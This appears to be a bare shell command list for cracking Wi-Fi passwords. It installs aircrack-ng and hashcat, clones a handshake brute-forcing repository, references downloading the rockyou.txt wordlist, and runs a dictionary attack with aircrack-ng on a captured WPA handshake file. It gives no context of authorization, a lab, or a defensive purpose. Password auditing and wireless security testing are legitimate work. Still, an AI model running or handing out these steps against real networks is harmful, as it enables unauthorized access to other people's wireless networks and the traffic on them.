sudo apt update
sudo apt install aircrack-ng python3 hashcat nano -y
cd /root
git clone https://github.com/ikinre/capbrute.git cap
cd cap
//wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O rockyou.txt 
python3 hy.py
aircrack-ng -w rockyou.txt handshake.cap
